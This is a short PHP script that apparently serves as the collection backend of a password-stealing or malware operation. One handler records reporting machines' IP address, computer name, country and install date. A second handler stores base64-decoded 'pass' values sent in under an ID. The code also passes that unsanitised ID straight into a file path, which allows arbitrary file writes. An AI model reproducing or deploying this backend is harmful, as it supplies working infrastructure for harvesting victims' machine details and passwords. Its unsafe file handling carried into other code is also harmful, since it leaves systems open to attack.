<?php
if (isset($_GET['online'])) {
    $path    = 'psw';
    $files = array_diff(scandir($path), array('.', '..'));
    $CountFiles = count($files) + 1;
    $FileName = 'ip-'.$CountFiles.'.txt';
    $ip = $_POST['ip'];
    $computername = $_POST['computername'];
    $installdate = $_POST['installdate'];
    $country = $_POST['country'];
    $FFD = '{"ip":"'.$ip.'","computername":"'.$computername.'","country":"'.$country.'","date":"'.$installdate.'"}';
    $myfile = fopen('psw/'.$FileName, "w") or die("Unable to open file!");
    fwrite($myfile, $FFD);
    fclose($myfile);
    echo $CountFiles;
}
if (isset($_GET['passwordenter'])) {
    $pass = $_POST['pass'];
    $ID1 = $_POST['id'];
    $FileName2 = 'ip-'.$ID1.'.txt';
    $myfile = fopen("pswdata/".$FileName2, "w") or die("Unable to open file!");
    fwrite($myfile, base64_decode($pass));
    fclose($myfile);
    echo 'done';
}
?>